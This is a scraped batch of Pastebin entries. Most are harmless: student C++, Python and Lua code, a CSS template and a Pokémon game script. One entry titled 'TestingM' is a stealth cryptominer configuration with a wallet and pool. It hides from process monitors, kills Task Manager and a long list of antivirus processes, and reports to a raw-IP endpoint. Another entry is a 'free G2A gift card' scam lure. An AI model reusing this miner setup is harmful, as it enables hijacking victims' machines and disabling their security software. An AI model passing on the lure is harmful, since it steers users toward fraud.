id,title,username,language,date,content
5LVdtVB8,lab 10,SillyWolfy,C++,Monday 13th of May 2024 12:46:36 AM CDT,"#define NOMINMAX
#include <windows.h>
#include <iostream>
#include <string>
#include <limits>
using namespace std;

template<typename T>
struct Node {
    T data;
    Node* next;

    Node(T val) : data(val), next(nullptr) {}
};

template<typename T>
class LinkedList {
private:
    Node<T>* head;

public:
    LinkedList() : head(nullptr) {}
    void push_back(T value) {
        Node<T>* newNode = new Node<T>(value);
        if (head == nullptr) {
            head = newNode;
        }
        else {
            Node<T>* temp = head;
            while (temp->next != nullptr) {
                temp = temp->next;
            }
            temp->next = newNode;
        }
    }
    void remove_at(int position) {
        Node<T>* temp = head;
        if (position == 0) {
            head = head->next;
            delete temp;
            return;
        }
        for (int i = 0; temp != nullptr and i < position - 1; ++i) {
            temp = temp->next;
        }
        Node<T>* nodeToDelete = temp->next;
        temp->next = temp->next->next;
        delete nodeToDelete;
    }
    void print() const {
        Node<T>* temp = head;
        while (temp != nullptr) {
            temp->data.print();
            cout << '\n';
            temp = temp->next;
        }
    }
    int size() const {
        int count = 0;
        Node<T>* temp = head;
        while (temp != nullptr) {
            count++;
            temp = temp->next;
        }
        return count;
    }
    T& get(int index) {
        Node<T>* temp = head;
        for (int i = 0; temp != nullptr and i < index; ++i) {
            temp = temp->next;
        }
        return temp->data;
    }
    ~LinkedList() {
        Node<T>* current = head;
        Node<T>* nextNode;
        while (current != nullptr) {
            nextNode = current->next;
            delete current;
            current = nextNode;
        }
    }
};

class Product
{
public:
    Product();
    Product(string namee, int weightt, int pricee, int lifee) {
        this->name = namee;
        this->weight = weightt;
        this->price = pricee;
        this->life = lifee;
    }
    void print() const {
        cout << ""Название продукта: "" << this->name << '\n'
            << ""Вес продукта: "" << this->weight << '\n'
            << ""Цена продукта: "" << this->price << '\n'
            << ""Срок годности продукта: "" << this->life << '\n';
        if (life <= 2) {
            cout << ""Данный товар идёт по уценке!\n"";
        }
    }
    string get_name() const {
        return this->name;
    }
private:
    string name;
    int weight;
    int price;
    int life;
};

void add_product(LinkedList<Product>& database) {
    cout << ""\tДобавление продукта в список\n"";
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    cout << ""Введите название продукта: "";
    string name;
    getline(cin, name);
    cout << '\n';
    cout << ""Введите вес продукта: "";
    int weight;
    while (true) {
        cin >> weight;
        if (cin.fail() or weight <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            break;
        }
    }
    cout << '\n';
    cout << ""Введите цену продукта: "";
    int price;
    while (true) {
        cin >> price;
        if (cin.fail() or price <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            break;
        }
    }
    cout << '\n';
    cout << ""Введите срок годности продукта в днях продукта: "";
    int life;
    while (true) {
        cin >> life;
        if (cin.fail() or life <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            break;
        }
    }
    database.push_back(Product(name, weight, price, life));
}

void delete_product(LinkedList<Product>& database, int index) {
    database.remove_at(index - 1);
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    setlocale(LC_ALL, ""Russian"");
    LinkedList<Product> DateBase;
    while (true) {
        cout << ""\tMeню\n"";
        cout << ""Необходимо выбрать один из пунктов:\n"";
        cout << ""1) Добавить продукт в список\n"";
        cout << ""2) Удалить продукт из списка\n"";
        cout << ""3) Вывести список\n"";
        cout << ""4) Закончить программу\n"";
        cout << ""Введите номер необходимого пункта: "";
        int choice;
        while (true) {
            cin >> choice;
            if (cin.fail() or choice <= 0) {
                cin.clear();
                cin.ignore();
                cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
            }
            else {
                break;
            }
        }
        switch (choice) {
        case 1: {
            system(""cls"");
            add_product(DateBase);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 2: {
            system(""cls"");
            int dbSize = DateBase.size();
            if (dbSize == 0) {
                cout << ""В вашем списке ничего нет!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            for (int i = 0; i < dbSize; ++i) {
                cout << i + 1 << "". "" << DateBase.get(i).get_name() << '\n';
            }
            cout << ""Введите индекс продукта, который нужно удалить: "";
            int index;
            while (true) {
                cin >> index;
                if (cin.fail() or index <= 0 or index > dbSize) {
                    cin.clear();
                    cin.ignore();
                    cout << ""Некорректный ввод. Пожалуйста, введите число из доступного диапазона: "";
                }
                else {
                    break;
                }
            }
            delete_product(DateBase, index);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 3: {
            system(""cls"");
            if (DateBase.size() == 0) {
                cout << ""В вашем списке ничего нет!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            DateBase.print();
            system(""pause"");
            system(""cls"");
            break;
        }
        case 4: {
            return 0;
        }
        default:
            system(""cls"");
            break;
        }
    }
}
"
JFCDeKwC,TestingM,tarekxx,JSON,Monday 13th of May 2024 12:34:55 AM CDT,"{
    ""algo"": ""rx/0"",
    ""pool"": ""zeph-eu1.nanopool.org"",
    ""port"": 10943,
    ""wallet"": ""ZEPHs787ivBXAw2CUxSkCYBDey6SE8bgD7dgWYLS94reSxSkkytU97eTyx33LQGUdbEueLWTHKEdnYwQi5oVNWMQ5ULrHk6i9P9.XZXZXZX/mypassword1234"",
    ""ssltls"": true,
    ""max-cpu"": 20,
    ""idle-wait"": 1,
    ""idle-cpu"": 80,
    ""stealth-targets"": ""ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"",
    ""kill-targets"": ""Taskmgr.exe,zerotier-one_x64.exe,xmsdiag.exe,afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,advchk.exe,ahnsd.exe,alertsvc.exe,avmaisrv.exe,avsynmgr.exe,bitdefender_p2p_startup.exe,cavrid.exe,cavtray.exe,cmgrdian.exe,freshclam.exe,icepack.exe,mgavrtcl.exe,mghtml.exe,mgui.exe,navapsvc.exe,navapw32.exe,navw32.exe,nsmdtr.exe,ofcdog.exe,pav.exe,savscan.exe,spider.exe,xcommsvr.exe,Procmon64a.exe,Procmon64.exe,Procmon.exe,anvir.exe,MRT.exe"",
	""stealth-fullscreen"": true,
	""api-endpoint"": ""http://156.208.133.221:8080/api/endpoint.php?key=UnknownErrors""
}"
UXc6QQL9,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Monday 13th of May 2024 12:15:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_212687.pdf

Working as of:
13 May 2024"
Qm2EZQU7,𝐒𝐄𝐕𝐄𝐍,wilderanima,CSS,Monday 13th of May 2024 12:00:57 AM CDT,"     Hello, wildlings! 
 
  A straightforward placeholder code with an image and a scrolling words box. 
  Follow the dimensions of the images, otherwise, they won't fit properly. 
  Feel free to change colors! 
 
  Please do not steal this code. 
  Leave the credit! <3 Happy Writing! 
 
— — — — — — — — — — — — — — 

<style>

@import url('https://fonts.googleapis.com/css2?family=Economica:ital,wght@0,400;0,700;1,400;1,700&display=swap');

body {
cursor: url(https://66.media.tumblr.com/232c090ebdd37ae4bc17adb54e1e0344/tumblr_inline_ol4nwhvSwg1uxxza6_1280.png), auto;
background-color: #000;
}

::-webkit-scrollbar {
display: none;
}

::selection {
background: ;
color: white;
}

.container {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 0px;
height: 550px;
width: 550px;
background-color: #000;
}

.wilder {
position: fixed;
bottom: 0px;
right: 0px;
}

.image1 {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 250px;
height: 400px;
width: 250px;
background: url(https://placehold.co/250x400.png);
background-size: cover;
outline: 1px solid #554136;
outline-offset: -5px;
}

.words {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 275px;
right: 0px;
height: 355px;
width: 250px;
font: 12px economica;
color: #a3a597;
text-align: center;
overflow: auto;
}
b {
font: 13px economica;
color: #554136;
text-transform: uppercase;
font-weight: bold;
}
i {
font: 13px economica;
font-style: italic;
color: #7a6d65;
}
a {
text-decoration: none;
font: 13px times;
color: #7a6d65;
transition: 0.5s;
}
a:hover {
color: #a3a597;
text-shadow: 1px 1px 0px #7a6d65;

</style>

<!--
 MUSIC PLAYER #02 by glenthemes
 ♬ glenthpvs.tumblr.com/player02
--->
<script src=""//cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js""></script>
<link href=""//fonts.googleapis.com/css?family=Readex+Pro"" rel=""stylesheet"">
<link href=""//glenthemes.github.io/-music-/glenplayer02.css"" rel=""stylesheet"">
<script src=""//glenthemes.github.io/-music-/glenplayer02.js""></script>
<style element=""glenplayer02"">
:root {
 --MusicPlayer-Position:bottom left;
 --MusicPlayer-Edge-Offset:15px;
 
 --MusicPlayer-Buttons-Size:14px;
 --MusicPlayer-Buttons-Color:#554136;
 --MusicPlayer-Buttons-Fill:yes;

}
</style>

<div glenplayer02>
<div controls></div>
<i class=""aa-line-icons"" icon-name=""music-2""></i>
<audio src=""MUSIC_LINK"" volume=""100%""></audio>
</div>

<div class=""wilder""><a target=""_blank"" href=""https://pastebin.com/u/wilderanima"" title=""code by wilder.""><img src=""https://i.imgur.com/hCJmFVu.png"" width=""75px;""></a></div>

<div class=""container"">
<div class=""image1""></div>
<div class=""words"">

<b>let's try something bold.</b> <br>
<i>how about something italic?</i> <br>
<a>and for good measure? a link.</a> <br><br>

lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <br><br>

ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. <br><br>

duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. <br><br>

excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. <br><br>

<hr size=""1"" width=""100%"" noshade style=""color:#554136""/>
<br>

words. <br><br>

</div>
</div>"
z0rnHH0Y,CC: GhoulMonitor,deadinside1222,Lua,Sunday 12th of May 2024 11:27:22 PM CDT,"local monitor = peripheral.find(""monitor"")

if monitor then
    
    monitor.clear()
    monitor.setCursorPos(1,1)

    
    local i = 1000

    
    while true do
        monitor.clear()     
        monitor.write(tostring(i))
        i = i - 7     
        if i < 0 then
            i = 1000
        end
        
        
        sleep(0.5)
    end
else
    print(""ERROR"")
end"
3KRELrGj,Online Trainer v21,FiaPlay,Ruby,Sunday 12th of May 2024 11:03:15 PM CDT,"#-----------------------------------------------------------------------------
# Script creado por FiaPlay para Pokémon Essentials BES. Créditos si se usa.
# Discord de FP Systems: https://discord.gg/ds8DWB5NSW
# Si vas reportar algún bug o preguntar algo recomiendo hacerlo en el hilo del server de PokeLiberty o en FP Systems.
#-----------------------------------------------------------------------------
# Demostración
#-----------------------------------------------------------------------------
# Modo de uso:
# *Usa fpDownloadBattle para descargar los datos de la batalla
# *Usa OnlineBattle.start() para iniciar la batalla
# ****Los siguientes pasos no deben hacerse en la versión que los jugadores descargarán****
# *Crea una copia de tu juego para generar los datos
# *Usa el modo depurador para dejar tu equipo igual al que quieres para el entrenador.
# *Usa OnlineBattle.new(trtype,trname,doublebattle,endspeech)
# trtype es el ID del tipo de entrenador
# trname es el nombre del entrenador
# doublebattle indica si será un combate doble
# endspeech es lo que dirá el entrenador al terminar el combate
# battle_rules un array con las battle rules activas
# items un array con los objetos del rival
# Eso creará el archivo OnlineBattle.txt en la capeta del juego.
# Sube el contenido de OnlineBattle.txt a internet (recomendable pastebin.com)
=begin Para un ejemplo de como generar el combate:
r=[""2v2"",[""weather"",:Rain]]
OnlineBattle.new(:LEADER_Brock, ""Koga"",false,""Buena Pelea."",r)
=end

#-----------------------------------------------------------------------------
URRL = ""https://pastebin.com/raw/YLYPMEVK"" # Enlace a el txt con los datos encriptados.
BATTLE_BGM = """" # BGM usado para la batalla (si se deja en blanco se usará la música por defecto del entrenador)
class OnlineBattle
  attr_accessor :trainer
  attr_accessor :team
  attr_accessor :doublebattle
  attr_accessor :endspeech
  attr_accessor :rules
  attr_accessor :items

  def initialize(trtype,trname,doublebattle=false,endspeech="""",battle_rules=[],items=[])
    @team = $player.party
    @trainer = NPCTrainer.new(trname,trtype)
    @doublebattle = doublebattle
    @trainer.lose_text = endspeech
    @rules     = battle_rules
    text=pbMysteryGiftEncrypt(self)
    $PokemonGlobal.downloaded_battle=text
    File.open(""OnlineBattle.txt"",""wb""){|f|
       f.write(text)
      }
  end

#===============================================================================
# Trainer battles
#===============================================================================
  def self.start(var=1)
    b=fpLoadDownloandedBattle
    if !b
      pbMessage(""No se han podido cargar los datos de la batalla"")
      return
    end
    for i in b.rules
      if i.is_a?(Array)
        setBattleRule(i[0],i[1])
      else
        setBattleRule(i)
      end
    end
    outcome_variable = $game_temp.battle_rules[""outcomeVar""] || var
    can_lose         = $game_temp.battle_rules[""canLose""] || false
    # Skip battle if the player has no able Pokémon, or if holding Ctrl in Debug mode
    if BattleCreationHelperMethods.skip_battle?
      return BattleCreationHelperMethods.skip_battle(outcome_variable, true)
    end
    # Record information about party Pokémon to be used at the end of battle (e.g.
    # comparing levels for an evolution check)
    EventHandlers.trigger(:on_start_battle)
    # Generate information for the foes
    foe_trainers = [b.trainer]
    foe_items = []
    foe_party = b.team
    # Generate information for the player and partner trainer(s)
    player_trainers, ally_items, player_party, player_party_starts = BattleCreationHelperMethods.set_up_player_trainers(foe_party)
    # Create the battle scene (the visual side of it)
    scene = BattleCreationHelperMethods.create_battle_scene
    # Create the battle class (the mechanics side of it)
    battle = Battle.new(scene, player_party, foe_party, player_trainers, foe_trainers)
    battle.party1starts = player_party_starts
    battle.party2starts = [0]
    battle.ally_items   = ally_items
    battle.items        = foe_items
    # Set various other properties in the battle class
    setBattleRule(""#{foe_trainers.length}v#{foe_trainers.length}"") if $game_temp.battle_rules[""size""].nil?
    BattleCreationHelperMethods.prepare_battle(battle)
    $game_temp.clear_battle_rules
    # Perform the battle itself
    outcome = 0
    pbBattleAnimation(pbGetTrainerBattleBGM(foe_trainers), (battle.singleBattle?) ? 1 : 3, foe_trainers) do
      pbSceneStandby { outcome = battle.pbStartBattle }
      BattleCreationHelperMethods.after_battle(outcome, can_lose)
    end
    Input.update
    # Save the result of the battle in a Game Variable (1 by default)
    BattleCreationHelperMethods.set_outcome(outcome, outcome_variable, true)
    return outcome
  end
end

def fpDownloadBattle()
  text = pbDownloadToString(URRL)
  if text.length>0
    $PokemonGlobal.downloaded_battle=text
  end
end

def fpLoadDownloandedBattle
  text=$PokemonGlobal.downloaded_battle
  return false if !text || text.length==0
  b=Marshal.restore(Zlib::Inflate.inflate(text.unpack(""m"")[0]))
  return b
end

class PokemonGlobalMetadata
  attr_accessor :downloaded_battle
end

def pbGetTrainerBattleBGM(trainer,online=false)
  pbStringToAudioFile(BATTLE_BGM) if online && BATTLE_BGM.length>0
  return $PokemonGlobal.nextBattleBGM.clone if $PokemonGlobal.nextBattleBGM
  ret = nil
  music = nil
  trainerarray = (trainer.is_a?(Array)) ? trainer : [trainer]
  trainerarray.each do |t|
    trainer_type_data = GameData::TrainerType.get(t.trainer_type)
    music = trainer_type_data.battle_BGM if trainer_type_data.battle_BGM
  end
  ret = pbStringToAudioFile(music) if music && music != """"
  if !ret
    # Check map metadata
    music = $game_map.metadata&.trainer_battle_BGM
    ret = pbStringToAudioFile(music) if music && music != """"
  end
  if !ret
    # Check global metadata
    music = GameData::Metadata.get.trainer_battle_BGM
    ret = pbStringToAudioFile(music) if music && music != """"
  end
  ret = pbStringToAudioFile(""Battle trainer"") if !ret
  return ret
end
"
aJDKNH7s,Meta,tinn01,GetText,Sunday 12th of May 2024 10:58:47 PM CDT,"S-1-5-21-1193083378-3124615022-3272316965-1002 - me
S-1-5-21-2828353685-3820469404-3474401707-1000 - gojo // 6 - 13 "
5R6S482L,Series (Biram),AhmadXploit,Dart,Sunday 12th of May 2024 10:50:11 PM CDT,"{
  ""series"": [
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    }
  ]
}"
3fnNrdxu,Untitled,AbsolutelyS,C++,Sunday 12th of May 2024 10:47:24 PM CDT,"/*
 * Towers of Hanoi
 */

void move(int disk, char source, char destination) {
    cout << ""Move disk "" << disk << "" from rod "" << source << "" to rod "" << destination << endl;
}

void towersOfHanoi(int n, char source, char destination, char auxiliary) {
    if (n == 1) {
        move(n, source, destination);
        return;
    }

    towersOfHanoi(n - 1, source, auxiliary, destination);
    move(n, source, destination);
    towersOfHanoi(n - 1, auxiliary, destination, source);
}"
6z4MJLqS,Untitled,Hend_Sayed,Python,Sunday 12th of May 2024 10:46:03 PM CDT,"#eightpuzzle

from tkinter import *
from tkinter import messagebox
import random
import copy
import time

#    init:      goal:
#    7 2 4      0 1 2
#    5 0 6      3 4 5
#    8 3 1      6 7 8

_goal_state = '012345678'
_init_state = '724506831'

# neighbors of each square
_neighbors = {0: [1,3],
              1: [0,2,4],
              2: [1,5],
              3: [0,4,6],
              4: [1,3,5,7],
              5: [2,4,8],
              6: [3,7],
              7: [4,6,8],
              8: [5,7]}

# Manhattan Distances from any square to another
_distance = [[0,1,2,1,2,3,2,3,4],
             [1,0,1,2,1,2,3,2,3],
             [2,1,0,3,2,1,4,3,2],
             [1,2,3,0,1,2,1,2,3],
             [2,1,2,1,0,1,2,1,2],
             [3,2,1,2,1,0,3,2,1],
             [2,3,4,1,2,3,0,1,2],
             [3,2,3,2,1,2,1,0,1],
             [4,3,2,3,2,1,2,1,0]]


_algo = {1:""Breadth-First Search"", 
        2:""Iterative Deepening Search"",
        3:""A* Search"", 
         }

class EightPuzzle(object):

    def __init__(self, input_state=None):
        if input_state:
            self.state = copy.deepcopy(input_state)
        else:       
            # generate a solvable state randomly
            self.state = copy.deepcopy(_goal_state)
            self.shuffle()
            
    # shuffle the current state
    def shuffle(self):
        pos0 = self.state.index('0')
        for i in range(100):
            choices = _neighbors[pos0]
            pos = choices[random.randint(0, len(choices)-1)]
            self.swap(pos)
            pos0 = self.state.index('0')

        # # generate a 8-puzzle problem with 1/2 chance to be unsolvable
        # l = list('012345678')
        # random.shuffle(l)
        # self.state = ''.join(l)

    # swap 0 with its neighbor pos
    def swap(self, pos):
        pos0 = self.state.index('0')
        l = list(self.state)
        l[pos0], l[pos] = l[pos], l[pos0]
        self.state = ''.join(l)

    # get all the possible next states
    def get_next(self, current):
        pos0 = current.index('0')
        nextStates = []

        for pos in _neighbors[pos0]:
            l = list(current)
            l[pos0], l[pos] = l[pos], l[pos0]
            step = ''.join(l)
            nextStates.append(step)
        return nextStates  

    # BFS algorithm
    def solve_by_BFS(self):

        root = self.state
        goal = '012345678'
        previous = {root: None}
        visited = {root: True}
        solved = (root == goal)
        q = [root]
        while q and not solved:
            current = q.pop(0)
            for next_node in self.get_next(current):
                if not next_node in visited:
                    visited[next_node] = True
                    previous[next_node] = current
                    q.append(next_node)
                if next_node == goal:
                    solved = True
                    break
        
        # return shortest path and number of states explored
        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)


    # Iterative Deepening search algorithm
    def solve_by_IDS(self):

        # DFS with depth limit
        def explore(current, depth):
            nonlocal goal, solved, limit
            if current == goal:
                solved = True
                return
            if depth >= limit:
                return
            next_depth = depth+1
            for next_node in self.get_next(current):
                if not next_node in visited:
                    visited[next_node] = True
                    previous[next_node] = current
                    if not next_depth in level:
                        level[next_depth] = []
                    level[next_depth].append(next_node)
                    explore(next_node, next_depth)
                if solved:
                    break

        root = self.state
        goal = '012345678'
        previous = {root: None}
        visited = {root: True}
        level = {0:[root]}
        solved = (root == goal)
        limit = 0
        while not solved and limit in level:
            depth = limit
            limit += 1
            for node in level[depth]:
                explore(node, depth)

        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)


    # A* algorithm
    def solve_by_Astar(self, method):

        class Node(object):
            def __init__(self, state):
                self.state = state
                self.g = 100000
                self.h = 100000
            def __str__(self):
                return self.state
            def f(self):
                return self.g+self.h
            def heuristic(self, method):
                goal = '012345678'
                count = 0
                if method == 1: # misplaced tiles
                    for i in range(9):
                        if self.state[0] != goal[0]:
                            count += 1
                else:   # Manhattan distance
                    for i in range(9):
                        pos = goal.index(self.state[i])
                        count += _distance[pos][i]
                self.h = count

        root = Node(self.state)
        root.g = 0
        root.heuristic(method)
        goal = '012345678'
        previous = {str(root): None}
        visited = {str(root): True}
        solved = (str(root) == goal)
        q = {root.f():[root]}

        while not solved and q:
            # pop from the min-queue
            try:
                i = min(q)
            except Exception as e:
                continue
            try:
                current = q[min(q)].pop()
            except Exception as e:
                del q[min(q)]
                continue
            
            visited[str(current)] = True
            for temp in self.get_next(str(current)):
                if temp in visited:
                    continue
                node = Node(temp)
                if node.g > current.g+1:
                    node.g = current.g+1
                    previous[temp] = str(current)
                node.heuristic(method)
                if not node.f() in q:
                    q[node.f()] = []
                q[node.f()].append(node)

                if temp == goal:
                    solved = True
                    break

        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)

    # retrieve the shortest path
    def retrieve_path(self, goal, previous):
        path = [goal]
        current = goal
        while previous[current]:
            path.insert(0, previous[current])
            current = previous[current]
        return path


puzzle = EightPuzzle(_init_state)

# display the current puzzle state 
def display():
    color = 'DeepPink' if puzzle.state != _goal_state else 'green'

    for i in range(9):
        if puzzle.state[i] != '0':
            var[i].set(str(puzzle.state[i]))
            label[i].config(bg=color)
        else:
            var[i].set('')
            label[i].config(bg='white')

# solve 8-puzzle using specific algorithm
def solve():
    for b in button:
        b.configure(state='disabled')
    option.configure(state='disabled')

    run = {1: puzzle.solve_by_BFS,
        2: puzzle.solve_by_IDS,
        3: lambda:puzzle.solve_by_Astar(1)}

    temp = select.get()
    index = 1
    for k,e in _algo.items():
        if e == temp:
            index = k
            break
    
    print('Solving...')
    
    # get solving time
    stime = time.time()
    path, n = run[index]()
    ttime = time.time()

    # if 8-puzzle is unsolvable
    if not path:    
        print('This 8-puzzle is unsolvable!')
        for i in range(9):
            label[i].config(bg='red' if puzzle.state[i] != '0' else 'white')
        for b in button:
            b.configure(state='normal')
        option.configure(state='normal')
        return

    info = 'Algorithm: '+_algo[index]+'\n' \
         + 'Time: '+str(round(ttime-stime, 6))+'s\n' \
         + 'States Explored: '+str(n)+'\n' \
         + 'Shortest Path: '+str(len(path)-1)+' steps.'
    print(info)
    display_procedure(path)    

# demonstrate the shortest path
def display_procedure(path):
    if not path:
        for b in button:
            b.configure(state='normal')
        option.configure(state='normal')
        return
    puzzle.state = path.pop(0)
    display()
    win.after(500, lambda: display_procedure(path)) 

# shuffle the state
def shuffle():
    puzzle.shuffle()
    display()

# reset to the initial state
def reset():
    puzzle.state = copy.deepcopy(_init_state)
    display()

# move with mouse clicking
def move(event):
    text = event.widget.cget('text')
    if not text:
        return
    
    pos = puzzle.state.index(text)
    pos0 = puzzle.state.index('0')
    if _distance[pos0][pos] > 1:
        return

    puzzle.swap(pos)
    display()

#
# Set up of Basic UI
#
win = Tk()
win.geometry('+300+100')
win.title('8-Puzzle')
algoFrame = Frame(win, width=260, relief=RAISED)
algoFrame.pack()
select = StringVar(algoFrame)
select.set(_algo[1]) # default value
option = OptionMenu(algoFrame, select, _algo[1], _algo[2], _algo[3])
option.pack()
board = Frame(win, width=260, height=260, relief=RAISED)
board.pack()
var = [StringVar() for i in range(9)]
label = [Label(board, textvariable=var[i], bg='gray', font=('Calibri', 48)) for i in range(9)]
for i in range(3):
    for j in range(3):
        label[i*3+j].bind(""<Button-1>"", lambda event: move(event))
        label[i*3+j].place(x=85*j+5,y=85*i+5, width=80, height=80)
        
buttonFrame = Frame(win, relief=RAISED, borderwidth=1)
buttonFrame.pack(fill=X, expand=True)
button = []
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Reset"", command=reset))
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Random"", command=shuffle))
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Solve"", command=solve)) # to be initialized
for b in button:
    b.pack(side=LEFT, padx=5, pady=7)


# initialization of the game
def main():
    display()
    win.mainloop()

if __name__ == ""__main__"":
    main()
"
